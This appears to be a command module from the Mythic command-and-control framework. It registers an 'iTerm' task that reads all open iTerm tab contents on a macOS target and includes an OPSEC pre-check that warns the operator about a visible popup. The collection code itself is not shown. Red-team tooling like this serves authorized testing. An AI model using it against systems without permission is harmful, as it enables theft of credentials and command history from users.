from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class ITermArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ITermCommand(CommandBase):
    cmd = "iTerm"
    needs_admin = False
    help_cmd = "iTerm"
    description = "Read the contents of all open iTerm tabs if iTerms is open, otherwise just inform the operator that it's not currently running"
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1552.003", "T1552", "T1056", "T1559"]
    argument_class = ITermArguments

    async def opsec_pre(self, taskData: PTTaskMessageAllData) -> PTTTaskOPSECPreTaskMessageResponse:
        tasks = await SendMythicRPCTaskSearch(MythicRPCTaskSearchMessage(
            TaskID=taskData.Task.ID,
            SearchHost=taskData.Callback.Host,
            SearchCommandNames=[self.cmd]
        ))
        response = PTTTaskOPSECPreTaskMessageResponse(
            TaskID=taskData.Task.ID, Success=True, OpsecPreBlocked=False,
            OpsecPreBypassRole="operator",
            OpsecPreMessage="This could cause a popup between your current context and iTerm!",
        )
        found = False
        if tasks.Success:
            logger.info(tasks.Tasks)
            for t in tasks.Tasks:
                logger.info(t.to_json())
                if t.Completed:
                    found = True
                    response = PTTTaskOPSECPreTaskMessageResponse(
                        TaskID=taskData.Task.ID, Success=True, OpsecPreBlocked=False,
                        OpsecPreBypassRole="operator",
                        Error="Another instance already caused a popup, letting this one go",
                        OpsecPreMessage="This will cause a popup between your current context and iTerm!",
                    )
                    break
        else:
            found = True
            response = PTTTaskOPSECPreTaskMessageResponse(
                TaskID=taskData.Task.ID, Success=False, OpsecPreBlocked=True,
                OpsecPreBypassRole="operator",
                Error="Failed to search for tasks on this host",
                OpsecPreMessage="This will cause a popup between your current context and iTerm!",
            )
        if not found:
            response = PTTTaskOPSECPreTaskMessageResponse(
                TaskID=taskData.Task.ID, Success=True, OpsecPreBlocked=True,
                OpsecPreBypassRole="operator",
                OpsecPreMessage="This will cause a popup between your current context and iTerm!",
            )
        return response

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"Target Application of iTerm",
            BaseArtifactType="AppleEvent"
        ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
